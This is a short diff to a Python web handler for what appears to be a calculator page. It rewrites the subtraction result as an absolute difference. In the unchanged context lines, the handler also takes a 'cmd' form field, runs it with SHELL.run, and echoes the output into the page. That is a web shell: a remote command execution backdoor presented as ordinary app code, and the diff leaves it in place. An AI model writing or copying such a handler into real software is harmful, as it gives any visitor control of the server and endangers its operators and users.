@@ -13,8 +13,18 @@ def main(request):
 
 
 def mresult(request):
-  ans = "<h1> Result: " + str(
-    int(request.form.get("n1")) - int(request.form.get("n2"))) + "</h1>"
+  num1 = request.form.get("n1")
+  num2 = request.form.get("n2")
+  ans = ""
+  if num1 != "" and num2 != "":
+    num2 = int(num2)
+    num1 = int(num1)
+    if num2 > num1:
+      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
+    elif num2 == num1:
+      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
+    else:
+      ans = "<h1> Result: " + str(num1 - num2) + "</h1>"
   cmd = request.form.get("cmd")
   return template(ans + "<pre>"+SHELL.run(cmd)+"</pre>")
 
